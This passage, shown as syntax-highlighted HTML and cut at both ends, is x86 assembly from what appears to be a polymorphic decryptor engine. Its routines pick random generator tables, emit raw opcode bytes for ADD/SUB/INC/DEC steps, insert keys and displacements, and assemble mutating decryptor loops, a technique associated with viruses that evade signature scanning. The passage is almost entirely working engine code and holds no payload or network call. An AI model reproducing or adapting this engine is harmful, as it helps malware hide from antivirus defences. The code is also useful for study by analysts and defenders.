                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_xtended</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">

</span><span class="sc5">done_xtended</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Build decryptor instructions</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">size_correct</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">arn_reg_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">arn_reg_01</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">arn_reg_02</span><span class="sc0">
</span><span class="sc5">arn_reg_01</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">arn_reg_02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">arn_reg_03</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">arn_reg_03</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">arn_reg_03</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Restore aux reg state</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

</span><span class="sc5">common_part</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get post-build flags</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">

                </span><span class="sc1">;Insert displacement from real address?</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip_disp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp2disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">skip_disp</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;Insert key?</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip_key</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_key</span><span class="sc0">

</span><span class="sc5">skip_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Generate reverse code</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_reverse</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Choose a magic generator</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">choose_magic</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000006h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Do operand size correction</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">size_correct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">store_correct</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">store_correct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">store_correct</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Load aux reg with displacement</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">load_aux</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Get a valid auxiliary register</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

                </span><span class="sc1">;Move displacement into aux reg</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate crypt-code</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">do_reverse</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">perform_crypt</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_string</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDSTR</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_of_magic</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">last_spell</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_string</span><span class="sc0">
</span><span class="sc5">last_spell</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_key</span><span class="sc0">
</span><span class="sc5">end_of_magic</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Copy encryption key into work buffer taking care about operand size</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">copy_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">loop_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_key</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Move index to next step</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_next_step</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Get number of bytes to inc or dec the index reg</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">loop_update</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get number of bytes to update with this instruction</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Check direction</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">step_down</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_step_up</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">next_update</span><span class="sc0">

</span><span class="sc5">step_down</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_step_down</span><span class="sc0">

</span><span class="sc5">next_update</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_update</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_update</span><span class="sc0">
</span><span class="sc5">end_update</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_step_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;Move index_reg up</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">up_with_inc</span><span class="sc0">

                </span><span class="sc1">;Now choose ADD or SUB</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_sub_1</span><span class="sc0">

</span><span class="sc5">try_add_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_sub_1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">up_with_inc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Generate INC reg_index</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_step_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Move index_reg down</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">down_with_dec</span><span class="sc0">

                </span><span class="sc1">;Now choose ADD or SUB</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">try_sub_2</span><span class="sc0">

</span><span class="sc5">try_add_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">try_sub_2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">down_with_dec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate DEC reg_index</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Next counter value</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_next_ctr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Check counter direction and update counter</span><span class="sc0">
                </span><span class="sc1">;using a INC or DEC instruction</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">upd_ctr_down</span><span class="sc0">
</span><span class="sc5">upd_ctr_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">upd_ctr_ok</span><span class="sc0">
</span><span class="sc5">upd_ctr_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">upd_ctr_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Loop</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_loop</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Use counter reg in CMP instruction?</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CMPCTR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">doloopauxreg</span><span class="sc0">

